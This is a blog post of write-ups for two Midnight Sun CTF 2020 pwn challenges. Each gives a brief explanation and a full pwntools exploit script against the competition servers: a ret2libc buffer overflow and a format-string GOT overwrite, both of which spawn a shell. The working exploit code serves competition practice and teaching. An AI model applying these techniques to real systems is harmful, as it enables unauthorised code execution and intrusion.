---
title: Midnight Sun CTF Quals 2020 - Pwn Writeups
summary: 
date: "2020-04-04T00:00:00Z"

reading_time: true  # Show estimated reading time?
share: true  # Show social sharing links?
profile: true  # Show author profile?
comments: true  # Show comments?
# Optional header image (relative to `static/img/` folder).
header:
  caption: ""
  image: ""
---
# **pwn1(70pts)** #

![TASK](https://imgur.com/4fbyzFx.png)

It was a ret2libc task , but we had firstly to leak the libc base address using BOF (i leaked it through printf address) than we will return to main and perform our ret2 System :D
here is my exploit, if you have any questions you can contact me on twitter @BelkahlaAhmed1 

```python

from pwn import *
p=remote("pwn1-01.play.midnightsunctf.se",10001)
#p=process("./pwn1")
OFFSET=cyclic(72)
POP_RDI_RET=p64(0x0000000000400783)
PUTS=p64(0x0000000000400550)
LEAK=p64(0x602020)
MAIN=p64(0x400698)
payload=OFFSET+POP_RDI_RET+LEAK+PUTS+MAIN
log.info("Payload Crafted")
p.recvuntil("buffer:")
log.info("Sending payload")
#raw_input("attach")
p.sendline(payload) 
data=p.recvline().strip()
leak=u64(data.ljust(8,"\x00"))
BASE_LIBC=leak-0x64e80       # local 0x54a20 
log.info("leaked libc base: "+hex(BASE_LIBC))
p.recvuntil("buffer:")
#BINSH=p64(BASELIBC+0x183cee)
#SYSTEM=p64(BASELIBC+0x46ed0)
RET=p64(0x0000000000400536)  
SYSTEM=p64(BASE_LIBC+0x4f440)
BINSH=p64(BASE_LIBC+0x1b3e9a)
payload=OFFSET+RET+POP_RDI_RET+BINSH+SYSTEM
p.sendline(payload)
p.interactive()
```
**NOTE:** Check Task files ** [HERE](https://github.com/kahla-sec/CTF-Writeups/tree/master/Midnight%20Sun%20CTF%202020%20Quals/pwn1) ** 

# **pwn2(80pts)** #

![TASK](https://imgur.com/lYjuGsS.png)

It was a really fun task , we had a format string vulnerability , so firstly i overwrited the GOT entry of the exit function with main address so we have now an infinite loop and the program will never exit , than using format string we leak the libc base address and than we overwrite the GOT entry of printf with the address of system :D 
Here is my exploit , if you have any questions you can contact me o twitter @BelkahlaAhmed1 

```python

from pwn import *
def extract(add,n):
        p1="0x"+add[-4:]
        p2=add[:6]
        if n==1:
                return p1
        if n==2:
                return p2
def pad(payload):
        return payload+"X"*(63-len(payload))
#p=process("./pwn2")
p=remote("pwn2-01.play.midnightsunctf.se",10002)
p.recvuntil("input:")
EXITGOT=p32(0x804b020)
EXITGOT2=p32(0x804b020+2)
'''
s=""
for i in range(27,34):
        s+="%"+str(i)+"$p "
'''
payload=EXITGOT+EXITGOT2
payload+="%2044x%8$hn%32231x%7$hn"
#raw_input("attach")
p.sendline(pad(payload))
p.recvuntil("input:")
p.sendline(pad("%30$x"))
data=p.recvuntil("X")
printf=int("0x"+data[-9:-1],16)-5
LIBCBASE=printf-0x50b60
log.info("Leaked Libc Base : "+hex(LIBCBASE))
p.recvuntil("input:")
PRINTFGOT=p32(0x804b00c)
PRINTFGOT2=p32(0x804b00c+2)
SYSTEM=LIBCBASE+0x3cd10
log.info("System address: "+hex(SYSTEM))
payload=PRINTFGOT
payload+=PRINTFGOT2
p1=int(extract(hex(SYSTEM),1),16)
p2=int(extract(hex(SYSTEM),2),16)
log.info("P1: "+str(p1-8)+" P2: "+str(p2-p1))
payload+="%"+str(p1-8)+"x%7$hn%"+str(p2-p1)+"x%8$hn"
log.info("Payload crafted")
p.sendline(pad(payload))
p.recvuntil("input:")
p.sendline("/bin/sh")
p.interactive()

#Main address 0x80485eb
# 7 stack adress

```

**NOTE:** Task files ** [HERE](https://github.com/kahla-sec/CTF-Writeups/tree/master/Midnight%20Sun%20CTF%202020%20Quals/pwn2) **

These tasks were really fun, i'm sorry for the lack of details because i'm really busy this period :( 
